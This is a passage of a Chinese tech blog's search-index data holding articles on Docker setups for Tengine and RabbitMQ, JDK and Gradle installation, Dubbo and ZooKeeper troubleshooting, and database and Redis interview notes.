上面的配置是docker-compose.yml文件的内容，数据卷部分可以根据自己的实际情况进行修改# 注意： 在/container/tengine/nginx.conf配置文件中需要手动修改root的路径为/usr/share/tengine/html 创建并启动 Tengine 容器 12345# 创建并启动容器# docker-compose up -d# 查看容器的运行状态# docker-compose ps var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"容器化 web服务器"},{title:"Docker 安装 RabbitMQ",url:"/posts/c6982fb6.html",text:'Docker-Compose 单机安装 RabbitMQ RabbitMQ 的数据库名称规则是 NODENAME@hostname，由于 Docker 每次从 Docker Image 启动容器的时候会自动生成 hostname，这样一来之前保存在主机上的数据库就会没用了，包括之前创建的用户也会没有了。所以在创建容器的时候必须指定 --hostname=rabbitmq，这样 Docker 环境启动后 RabbitMQ 就会一直读取固定目录中的数据了。docker-compose.yml 的文件内容如下，其中 RABBITMQ_DEFAULT_USER 为用户名，RABBITMQ_DEFAULT_PASS 为用户密码，5672 为 RabbitMQ 的服务端口，15672 为 RabbitMQ 的 Web 控制台的端口。RabbitMQ 的 Web 控制台默认是未启用的，若需启用 Web 控制台的功能，可以挂载对应的配置文件到容器内的 /etc/rabbitmq/enabled_plugins，而配置文件的内容为 RabbitMQ 启用的插件列表。 123456789101112131415161718192021222324rabbitmq: image: rabbitmq:3.8.14 container_name: rabbitmq-3.8.14 hostname: rabbitmq privileged: false networks: rabbitmq-network: ipv4_address: 172.175.0.5 environment: - RABBITMQ_DEFAULT_USER=admin - RABBITMQ_DEFAULT_PASS=admin ports: - 5672:5672 - 15672:15672 volumes: - \'/container/mahattan/rabbitmq/enabled_plugins:/etc/rabbitmq/enabled_plugins\'networks: rabbitmq-network: name: rabbitmq-network driver: bridge ipam: config: - subnet: 172.175.0.0/24 上述挂载的 /container/mahattan/rabbitmq/enabled_plugins 的配置文件内容如下： 1[rabbitmq_federation_management,rabbitmq_management,rabbitmq_mqtt,rabbitmq_stomp]. RabbitMQ 镜像与容器管理命令： 1234567891011# 创建并启动RabbitMQ容器# docker-compose up -d# 查看RabbitMQ的运行状态# docker-compose ps# 查看RabbitMQ的运行日志# docker logs rabbitmq-3.8.14# 浏览器访问RabbitMQ的管理界面，访问地址如下http://127.0.0.1:15672 参考资料 Docker 官方安装 RabbitMQ 的教程 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"容器化"},{title:"Linux 安装 Gradle",url:"/posts/7b495a3f.html",text:'前言本文适用于 CentOS/Debian/Ubuntu 等 Linux 发行版系统。 JDK 安装由于 Gradle 的运行依赖于 JDK，但是安装 Oracle JDK 不是必需的，如果不想安装可以使用 Open-JDK 替代，而且大多数 Linux 发行版自带 Open-JDK。 1234567891011121314151617181920212223242526272829303132# 下载Oracle JDK8# wget -P /usr/local --no-cookies --no-check-certificate --header "Cookie: gpw_e24=http%3a%2F%2Fwww.oracle.com%2Ftechnetwork%2Fjava%2Fjavase%2Fdownloads%2Fjdk8-downloads-2133151.html; oraclelicense=accept-securebackup-cookie;" "https://download.oracle.com/otn-pub/java/jdk/8u201-b09/42970487e3af4f5aa5bca3f542482c60/jdk1.8.0_201-linux-x64.tar.gz"# 解压Oracle JDK8# tar -xvf /usr/local/jdk1.8.0_201-linux-x64.tar.gz# 删除下载文件# rm /usr/local/jdk1.8.0_201-linux-x64.tar.gz# 如果已安装Open-JDK，则覆盖Java命令的软链接# ln -s -f /usr/local/jdk1.8.0_201/bin/java /usr/bin/java# ln -s -f /usr/local/jdk1.8.0_201/bin/javac /usr/bin/javac# 配置JDK的环境变量，在配置文件末尾追加以下内容即可# vim /etc/profileJAVA_HOME=/usr/local/jdk1.8.0_201JRE_HOME=/usr/local/jdk1.8.0_201/jreCLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/libPATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/binexport JAVA_HOME JRE_HOME CLASSPATH PATH# 使环境变量生效# source /etc/profile# 验证环境变量是否生效，如果不生效建议重启系统# javac -versionjavac 1.8.0_201# java -versionjava version "1.8.0_201"Java(TM) SE Runtime Environment (build 1.8.0_201-b09)Java HotSpot(TM) 64-Bit Server VM (build 25.201-b09, mixed mode) Gradle 下载 Gradle 官方二进制包（ binary-only ） Gradle 安装1234567891011121314151617# 下载gradle# wget https://downloads.gradle.org/distributions/gradle-5.4.1-bin.zip# 解压gradle# unzip -d /usr/local gradle-5.4.1-bin.zip# 配置环境变量，编辑/etc/profile文件在末尾添加以下配置内容# vim /etc/profileGRADLE_HOME=/usr/local/gradle-5.4.1PATH=$PATH:$GRADLE_HOME/binexport GRADLE_HOME PATH# 使环境变量生效# source /etc/profile# 查看Gradle是否配置成功# gradle -v var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"linux"},{title:"浅析 RPC 远程过程调用基本原理",url:"/posts/37f9ab5d.html",text:'RPC 框架的核心 RPC 的核心模块： 通讯、序列化 主流的 RPC 框架： Dubbo、gRPC、Thrift、HSF、Motan、ZBUS RPC 的基本调用原理 一次完整的 RPC 调用流程（同步调用，异步另说）如下：1）服务消费方（client）调用以本地调用方式调用服务；2）client stub 接收到调用后负责将方法、参数等组装成能够进行网络传输的消息体；3）client stub 找到服务地址，并将消息发送到服务端；4）server stub 收到消息后进行解码；5）server stub 根据解码结果调用本地的服务；6）本地服务执行并将结果返回给 server stub；7）server stub 将返回结果打包成消息并发送至消费方；8）client stub 接收到消息，并进行解码；9）服务消费方得到最终结果。RPC 框架的目标就是要 2~8 这些步骤都封装起来，这些细节对用户来说是透明的，不可见的。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"分布式"},{title:"Dubbo 之四 Dubbo 开发随笔",url:"/posts/c944ed24.html",text:'SpringBoot-2.1.0+ 整合 Apache Dubbo-2.7.0，启动应用后提示需要添加 SpringBoot 配置 “spring.main.allow-bean-definition-overriding=true” 异常日志： 1234567891011***************************APPLICATION FAILED TO START***************************Description:The bean \'dubboConfigConfiguration.Single\', defined in null, could not be registered. A bean with that name has already been defined in null and overriding is disabled.Action:Consider renaming one of the beans or enabling overriding by setting spring.main.allow-bean-definition-overriding=true 异常分析： 123问题是由注解 @EnableDubbo、@EnableDubboConfig 的使用所导致，具体可参考以下资料：https://github.com/apache/dubbo/issues/3193https://github.com/apache/dubbo-spring-boot-project/issues/476 解决方法： 12345方法一：往SpringBoot的配置文件（application.properties）中添加对应配置，允许在Spring容器内可以覆盖Bean的定义： spring.main.allow-bean-definition-overriding=true方法二：将Apache Dubbo-2.7.0 升级到 Apache Dubbo-2.7.1版本，具体可参考：https://github.com/apache/dubbo-spring-boot-project/issues/467 宕机环境下 Dubbo 的健壮性与高可用性介绍 监控中心宕掉不影响使用，只是丢失部分采样数据 数据库宕掉后，注册中心仍能通过缓存提供服务列表查询，但不能注册新服务 注册中心对等集群，任意一台宕掉后，将自动切换到另一台 注册中心全部宕掉后，服务提供者和服务消费者仍能通过本地缓存通讯 服务提供者无状态，任意一台宕掉后，不影响使用 服务提供者全部宕掉后，服务消费者应用将无法使用，并无限次重连等待服务提供者恢复 Dubbo 服务降级 当服务器压力剧增的情况下，根据实际业务情况及流量，对一些服务和页面有策略的不处理或换种简单的方式处理，从而释放服务器资源以保证核心交易正常运作或高效运作。Dubbo 可以通过服务降级功能临时屏蔽某个出错的非关键服务，并定义降级后的返回策略。Dubbo 向注册中心写入动态配置覆盖规则如下： 123RegistryFactory registryFactory = ExtensionLoader.getExtensionLoader(RegistryFactory.class).getAdaptiveExtension();Registry registry = registryFactory.getRegistry(URL.valueOf("zookeeper://10.20.153.10:2181"));registry.register(URL.valueOf("override://0.0.0.0/com.foo.BarService?category=configurators&amp;dynamic=false&amp;application=foo&amp;mock=force:return+null")); 其中： mock=force:return+null 表示消费方对该服务的方法调用都直接返回 null 值，不发起远程调用。用来屏蔽不重要服务不可用时对调用方的影响。 还可以改为 mock=fail:return+null 表示消费方对该服务的方法调用在失败后，再返回 null 值，不抛异常。用来容忍不重要服务不稳定时对调用方的影响。 利用 Dubbo-Admin 的 UI 界面（旧版），可以方便地对服务进行屏蔽 / 恢复（mock=force:return+null）、容错 / 恢复（mock=fail:return+null）处理，即上面提到的两种服务降级方式 Dubbo 集群容错 在集群调用失败时，Dubbo 提供了多种容错方案，缺省为 failover 重试。真正的生产环境中，一般使用 Hystrix 进行容错处理。 Failover Cluster：失败自动切换，当出现失败，重试其它服务器。通常用于读操作，但重试会带来更长延迟。可通过 retries=”2” 来设置重试次数 (不含第一次)。 Failfast Cluster：快速失败，只发起一次调用，失败立即报错。通常用于非幂等性的写操作，比如新增记录。 Failsafe Cluster：失败安全，出现异常时，直接忽略。通常用于写入审计日志等操作。 Failback Cluster：失败自动恢复，后台记录失败请求，定时重发。通常用于消息通知操作。 Forking Cluster：并行调用多个服务器，只要一个成功即返回。通常用于实时性要求较高的读操作，但需要浪费更多服务资源。可通过 forks=”2” 来设置最大并行数。 Broadcast Cluster：广播调用所有提供者，逐个调用，任意一台报错则报错。通常用于通知所有提供者更新缓存或日志等本地资源信息。 1234Failover 重试次数的几种配置方式如下：&lt;dubbo:service retries="2" /&gt;&lt;dubbo:reference retries="2" /&gt;&lt;dubbo:reference&gt; &lt;dubbo:method name="findFoo" retries="2" /&gt; &lt;/dubbo:reference&gt; 123集群模式配置，按照以下几种配置方式在服务提供方和消费方配置集群模式：&lt;dubbo:service cluster="failsafe" /&gt;&lt;dubbo:reference cluster="failsafe" /&gt; Spring 与 SpringBoot 整合 Dubbo 整合 Dubbo 的三种方式 三种方式分别为：XML 配置、Annotation 配置、API 配置 Spring 与 SpringBoot 都支持以 XML 配置、Annotation 配置整合 Dubbo 由于使用基于注解的方式整合 Dubbo，无法实现 Dubbo 方法级的配置（即 dubbo:method 标签的功能），如果 Spring、SpringBoot 需要用到 Dubbo 方法级的配置，那么则需要使用 XML 的方式整合 Dubbo Spring 与 SpringBoot 整合 Dubbo 简单总结 SpringBoot + XML： @ImportResource SpringBoot + Annotation： @EnableDubbo Spring + Annotation： AnnotationConfigApplicationContext Spring + XML： ClassPathXmlApplicationContext、FileSystemXmlApplicationContext Dubbo 源码分析 1.Dubbo 框架设计介绍 2.XML 标签解析类：DubboNamespaceHandler、DubboBeanDefinitionParser 3.Dubbo 配置类之间的关系 4.Dubbo 的服务暴露 5.Dubbo 的服务引用 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"分布式 开发随笔"},{title:"ZooKeeper 开发随笔",url:"/posts/7053c1b0.html",text:'Apache Dubbo 使用 Curator 客户端连接 ZooKeeper 服务器时，抛出以下异常 异常日志： 1Caused by: org.apache.zookeeper.KeeperException$UnimplementedException: KeeperErrorCode = Unimplemented for /dubbo/xxx.xxx.service.UserService/providers/dubbo .... 异常分析：ZooKeeper 的版本与 Curator 的版本不兼容所导致，Curator 官网说明如下： 12345678910111213141516第一种情况：Curator 2.x.x compatible with both ZooKeeper 3.4.x and ZooKeeper 3.5.xCurator 3.x.x compatible only with ZooKeeper 3.5.x and includes support for new features such as dynamic reconfiguration, etc.第二种情况：ZooKeeper 3.5.x Curator 4.0 has a hard dependency on ZooKeeper 3.5.x If you are using ZooKeeper 3.5.x there\'s nothing additional to do - just use Curator 4.0ZooKeeper 3.4.x Curator 4.0 supports ZooKeeper 3.4.x ensembles in a soft-compatibility mode. To use this mode you must exclude ZooKeeper when adding Curator to your dependency management tool. 解决方法：针对第二种情况，假设各组件的版本分别为 Dubbo (2.7.0)、ZooKeeper (3.4.13)、Curator-Framework (4.0.1)，则需要排除 Curator-Framework (4.0.1) 默认依赖的高版本 ZooKeeper (3.5.x)，然后指定低版本的 ZooKeeper (3.4.x)，Maven 的 POM 写法如下： 12345678910111213141516171819202122232425&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.zookeeper&lt;/groupId&gt; &lt;artifactId&gt;zookeeper&lt;/artifactId&gt; &lt;version&gt;3.4.13&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.curator&lt;/groupId&gt; &lt;artifactId&gt;curator-framework&lt;/artifactId&gt; &lt;version&gt;4.0.1&lt;/version&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;org.apache.zookeeper&lt;/groupId&gt; &lt;artifactId&gt;zookeeper&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.curator&lt;/groupId&gt; &lt;artifactId&gt;curator-recipes&lt;/artifactId&gt; &lt;version&gt;4.0.1&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"分布式 开发随笔"},{title:"前端面试题之一",url:"/posts/66192ea1.html",text:'var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"企业面试"},{title:"ORM 框架 - DB 中间件面试题之一",url:"/posts/c3108f98.html",text:'MyBatis解决实体类的属性名与表的字段名不一致问题三种解决方法如下： 编写 SQL 语句时使用字段别名 在 MyBatis 的全局配置文件中开启驼峰命名规则 在 Mapper 映射文件中使用 resultMap 来自定义映射规则 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"企业面试"},{title:"数据库面试题之一",url:"/posts/51a718cc.html",text:'数据库数据库并发问题脏读A 事务执行过程中，B 事务读取了 A 事务的修改。但是由于某些原因，A 事务没有完成提交，发生 RollBack 操作，则 B 事务所读取的数据就会是不正确的，这个未提交数据就是脏读（Dirty Read）。脏读产生的流程如下： 幻读B 事务读取了两次数据，在这两次的读取过程中 A 事务添加了数据，B 事务的这两次读取出来的集合不一样。幻读看起来和不可重复读差不多，但幻读强调的集合的增减，而不是单独一条数据的修改。幻读产生的流程如下： 不可重复读B 事务读取了两次数据，在这两次的读取过程中 A 事务修改了数据，B 事务的这两次读取出来的数据不一样。B 事务这种读取的结果，即为不可重复读（Nonrepeatable Read）。不可重复读的产生的流程如下： 第一类丢失更新在完全未隔离事务的情况下，两个事务更新同一条数据资源，某一事务完成，另一事务异常终止，回滚造成第一个完成的更新也同时丢失 。第一类丢失更新的问题，在现代关系型数据库已经不会发生，这里不再累述。 第二类丢失更新不可重复读有一种特殊情况，两个事务更新同一条数据资源，后完成的事务会造成先完成的事务更新丢失，这种情况就是第二类丢失更新。主流的数据库已经默认屏蔽了第一类丢失更新问题（即：后做的事务撤销，发生回滚造成已完成事务的更新丢失），但日常开发的时候仍需要特别注意第二类丢失更新。它产生的流程如下： 数据库隔离级别为了解决上面提及的数据库并发问题，主流关系型数据库都会提供四种事务隔离级别： 读未提交（Read Uncommitted）在该隔离级别，所有事务都可以看到其他未提交事务的执行结果。该隔离级别是最低的隔离级别，虽然拥有超高的并发处理能力及很低的系统开销，但很少用于实际应用。因为采用这种隔离级别只能防止第一类更新丢失问题，不能解决脏读，幻读及不可重复读问题。 读已提交（Read Committed）这是大多数数据库系统的默认隔离级别（但不是 MySQL 默认的），例如 Oracle 数据库。它满足了隔离的简单定义：一个事务只能看见已经提交事务所做的改变。这种隔离级别可以防止脏读问题，但会出现幻读及不可重复读问题。 可重复读（Repeatable Read）这是 MySQL 的默认事务隔离级别，它确保在整个事务过程中，对同一条数据的读取结果是相同的，不管其他事务是否在对共享数据进行更新，也不管其他事务更新提交与否，这种隔离级别可以防止除幻读外的其他问题。 串行化（Serializable）这是最高的隔离级别，它通过强制事务排序，使之不可能相互冲突，从而解决幻读、第二类更新丢失问题。在这个级别，可以解决上面提到的所有并发问题，但可能导致大量的超时现象和锁竞争，通常数据库不会用这个隔离级别，可以其他的机制来解决这些问题，例如乐观锁和悲观锁。 案例说明 上图中是典型的第二类丢失更新问题，后果异常严重。当数据库隔离级别为读已提交（Read Committed）及以下隔离级别时，会出现不可重复读的现象。从上面的表格可以看出，当事务隔离级别设置为可重复读（Repeatable Read）时，可以避免不可重复读的现象出现。 总结这四种隔离级别会产生的问题如下（YES 表示存在对应的问题）： MySQL索引索引的类型（四种） FULLTEXT：即为全文索引，目前只有 MyISAM 引擎支持，其可以在 CREATE TABLE，ALTER TABLE，CREATE INDEX 使用，不过目前只有 CHAR、VARCHAR、TEXT 列上可以创建全文索引 HASH：由于 HASH 的唯一性及类似键值对的形式，很适合作为索引，HASH 索引可以一次定位，不需要像树形索引那样逐层查找，因此具有极高的效率。但是，这种高效是有条件的，即只在 “=” 和 “in” 条件下才高效，对于范围查询、排序及组合索引仍然效率不高 BTREE：一种将索引值按一定的算法，存入一个树形的数据结构中（二叉树），每次查询都是从树的入口 Root 开始，依次遍历 Node，获取 Leaf，这是 MySQL 里默认和最常用的索引类型 RTREE：在 MySQL 很少使用，仅支持 geometry 数据类型，支持该类型的存储引擎有 MyISAM、BDb、InnoDb、NDb、Archive 相对于 BTREE，RTREE 的优势在于范围查找。 索引的种类（五种） 普通索引：仅加速查询 全文索引：对文本的内容进行分词和搜索 唯一索引：加速查询 + 列值唯一（可以有 NULL） 主键索引：加速查询 + 列值唯一（不可以有 NULL） + 表中只能有一个主键索引 组合索引：多列值组成一个索引，专门用于组合搜索，其效率大于索引合并（使用多个单列索引组合搜索） 创建索引的时机一般来说，在 WHERE 和 JOIN 子句中出现的列需要建立索引，但也不完全如此，因为 MySQL 只对 &lt;、&lt;=、=、&gt;、&gt;=、BETWEEN、IN 以及某些时候的 LIKE 才会使用索引。例如下述的 SQL 语句，就需要对 city 和 age 列建立索引，由于 mytable_m 表的 userame 也出现在了 JOIN 子句中，因此也有对它建立索引的必要。 1SELECT t.Name FROM mytable_t LEFT JOIN mytable_m ON t.Name=m.username WHERE m.age=20 AND m.city=\'郑州\' ; 特别注意：上面提到只有某些时候的 LIKE 才需建立索引，因为在以通配符 % 开头作查询时，MySQL 不会使用索引；只有以通配符 % 结尾做查询时，MySQL 才会使用到索引。但有一种情况例外，那就是当触发了覆盖索引（select 的数据列只从索引中就能够取得，不必读取数据行，换句话说查询列要被所建的索引覆盖）的情况下，以通配符 % 开头作查询 MySQL 也会使用索引。例如：如果表里面只有 id 和 username 两个字段且都加了索引，那么 select * like \'%username\' 查询也是会使用索引的，前提是 select 数据列都加了索引。 哪些字段应该创建索引 增删改非常频繁的字段不适合作为索引 查询中与其他表关联的字段，例如外键应该建立索引 WHERE 和 JOIN 子句中，较频繁作为查询条件的字段应该创建索引 查询中排序（order by）、分组（group by）、统计的字段应该建立索引 唯一性太差的字段不适合创建索引，尽管频繁作为查询条件，例如：性别字段 索引不生效的情况 对于多列索引，如果不是使用的第一部分，则不会使用索引 如果 MySQL 估算使用全表扫描要比使用索引快，则不会使用索引 like 查询，即是以 % 开头的查询不会使用索引，除非 select 数据列都加了索引 如果列类型是字符串，那一定要在条件中将数据使用单引号包起来，否则索引不生效 如果条件中有 or，即使其中有部分条件带索引也不会使用。换言之，必须所有列都建有索引才有效 索引使用的代价 索引虽然可以大大提高了查询速度，但同时也会降低更新表的速度，如对表进行 INSERT、UPDATE 和 DELETE 操作；因为更新表时，MySQL 不仅要保存数据，还要更新索引文件 建立索引会占用更多的磁盘空间，这是因为需要分配磁盘空间给索引文件，一般情况这个问题不太严重，但如果在一个大表上创建了多种组合索引，索引文件的体积会膨胀得很快 索引使用注意事项 针对普通查询 避免使用 select * 连表时注意条件类型需一致 创建表时尽量时 char 代替 varchar &nbsp;count (1) 或 count (列) 代替&nbsp;count (*) 使用表连接（JOIN）来代替子查询（Sub-Queries） 针对索引使用 使用组合索引代替多个单列索引（经常使用多个条件查询时） 索引散列值（重复多的值）不适合建索引，例如：性别字段不适合建索引 索引不会包含有 NULL 值的列，只要列中包含有 NULL 值都将不会被包含在索引中，组合索引中只要有一列含有 NULL 值，那么这一列对于此组合索引就是无效的，因此在数据库设计时不要让字段的默认值为 NULL 不要在列上进行运算，例如 select * from users where YEAR(adddate)&lt;2007，将在每个行记录上进行运算，这将导致索引失效而进行全表扫描，因此可以改成 select * from users where adddate&lt;’2007-01-01′ 尽量使用短索引，对串列进行索引，如果可能应该指定一个前缀长度。例如：如果有一个 CHAR (255) 的列，如果在前 10 个或 20 个字符内，多数值是惟一的，那么就不要对整个列进行索引；短索引不仅可以提高查询速度，还可以节省磁盘空间和 I/O 操作 MySQL 5.0 之前，SQL 查询只能使用一个索引，因此如果 WHERE 子句中已经使用了索引的话，那么 order by、group by 中的列是不会使用索引的。因此如果数据库默认排序可以符合要求的情况下，不要使用排序操作，同时尽量使用不包含多个列的排序，如果需要最好给这些列创建组合索引 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"企业面试"},{title:"缓存面试题之一",url:"/posts/6a0cde5a.html",text:'Redis持久化机制RDB 与 AOF RDB（Redis DataBase）持久化，是在指定的时间间隔内将内存中的数据集快照写入磁盘（point-in-time snapshot）。在 Redis 运行时，RDB 程序将当前内存中的数据集快照保存到磁盘文件中，在 Redis 重启动时，RDB 程序可以通过载入 RDB 文件来还原数据库的状态 AOF（Append Only File）持久化，以日志的形式来记录每个写操作，将 Redis 执行过的所有写指令记录下来，同时只许追加文件不能改写文件。当 Redis 重新启时，程序就可以通过重新执行 AOF 文件中的命令来达到重建数据集的目的 RDB 的优缺点 RDB 的优点 节省磁盘空间 数据恢复速度快 RDB 的缺点 在一定的时间间隔做一次备份，如果 Redis 以为 down 掉的话，那么最后一次持久化后的数据可能会丢失 虽然 Redis 在 fork 时使用了写时拷贝技术，但是如果数据量较大时，比较耗性能，可能会导致 Redis 在数毫秒或者几秒内不能响应客户端的请求 AOF 的优缺点 AOF 的优点 可读的日志文件 备份机制更稳健，丢失数据的概率更低 AOF 的缺点 数据恢复速度较慢 对于相同的数据集来说，与 RDB 比较，占用更多的磁盘空间 若同步策略为每次写入都同步的话，有一定的性能压力，尤其是处理巨大的写入时 五大数据类型的应用场景Redis 支持的键值数据类型包括：字符串类型、散列类型、列表类型、集合类型、有序集合类型。 数据类型 常用操作命令 应用场景 String get、SET、incr、decr、mget 常规的 key-value 缓存应用：IP 屏蔽；常规计数：微博数、粉丝数 Hash hget、hSET、hgetall 存储部分频繁变更的数据，如用户信息等 List LPUSH、rpush、lpop、rpop、lrange Twitter 的关注列表，微博粉丝列表，最新消息排行榜，作为栈、消息队列使用 SET sadd、spop、smembers、sunion 求差集、交集、并集，例如：微博的共同关注、共同喜好、二度好友等功能 Sorted SET zadd、zrange、zrem、zcard 商品的综合排名、价格排名、优先级队列 Redis 实现优先级队列通常使用 List 类型来实现队列操作，这样有一个小限制，所有的任务统一都是先进先出，如果想优先处理某个任务就不太好处理了，这就需要让队列有优先级的概念，支持优先处理高级别的任务，具体实现方式有以下几种。 单一列表实现队列正常的操作是 左进右出（LPUSH，rpop），为了先处理高优先级任务，在遇到高级别任务时，可以直接插队，即直接将任务放入队列头部（rpush），这样从队列头部（右侧）获取任务时，取到的就是高优先级的任务（rpop）。相当于普通任务按照队列结构，碰到高优先级任务，就按照栈结构（先进后出）。优点是实现简单，缺点是高级别任务总是后进先出，而且高优先级的任务之间的执行顺序是先进后出的，这样保证不了高优先级任务之间的执行顺序。适用于简单的队列需求，例如高优先级任务较少的情况。 多队列实现使用两个队列，一个普通队列，一个高级队列，针对任务的级别放入不同的队列。获取任务时也很简单，Redis 的 BRPOP 命令可以按顺序从多个队列中取值。BRPOP 命令会按照给出的 key 顺序查看，并在找到的第一个非空 List 的尾部弹出一个元素，而且 BRPOP 命令是阻塞式的。 1redis&gt; BRPOP list1 list2 0 其中 list1 做为高优先级任务队列，list2 做为普通任务队列，这样就实现了先处理高优先级任务，当没有高优先级任务时，就去获取普通任务。 使用权值实现如果优先级比较复杂，比如假设有个这样的场景，优先级不是简单的高中低或者 0-10 这些固定的级别，而是类似 0-99999 这么多级别，使用多队列的方式实现起来就不太方便了。 思路一、基于 List 类型 + 多队列 + 二分法： 虽然 Redis 有 Sorted SET 这样的可以排序的数据类型，很可惜它没有阻塞版的接口，因此只能使用 List 类型通过其他方式来完成目的。简单的做法可以只设置一个队列，并保证它是按照优先级排序的；然后通过二分查找法查找一个任务合适的位置，并通过 LSET 命令将任务插入到相应的位置。例如队列里面包含着写优先级的任务 [1, 3, 6, 8, 9, 14]，当有个优先级为 7 的任务过来，通过二分算法一个个从队列里面取数据出来和目标数据比对，计算出相应的位置然后插入到指定位置即可。因为二分查找是比较快的，并且 Redis 的数据也都在内存中，理论上速度是可以保证的。但是如果说数据量确实很大的话也可以通过额外方式来调优，比如与 “多队列实现方案” 结合起来就会很大程度上减少开销。假设数据量十万的队列，它们的优先级也是随机 0-10W 万的区间。可以设置 10 个或者 100 个不同的队列，0-1W 的优先级任务投放到 1 号队列，2W-3W 的任务投放到 2 号队列。这样将一个队列按不同等级拆分后，它单个队列的数据量就减少许多，这样二分法查找匹配的效率也会高一点。但是数据所占的资源基本是不变的，十万数据该占多少内存还是多少，只是系统里面多了一些队列而已。 思路二、基于 List 类型（存疑）： 假设有 3 个级别，用权值来表示为 1、2、3，此时有 4 个元素需要入队，分别是：a-1，b-2，c-3，d-3。 首先使用 LPUSH 把元素放入队列中，同时设置权值： 1234567891011redis&gt; LPUSH mylist aredis&gt; SET mylist_score_a 1redis&gt; LPUSH mylist bredis&gt; SET mylist_score_b 2redis&gt; LPUSH mylist credis&gt; SET mylist_score_c 3redis&gt; LPUSH mylist dredis&gt; SET 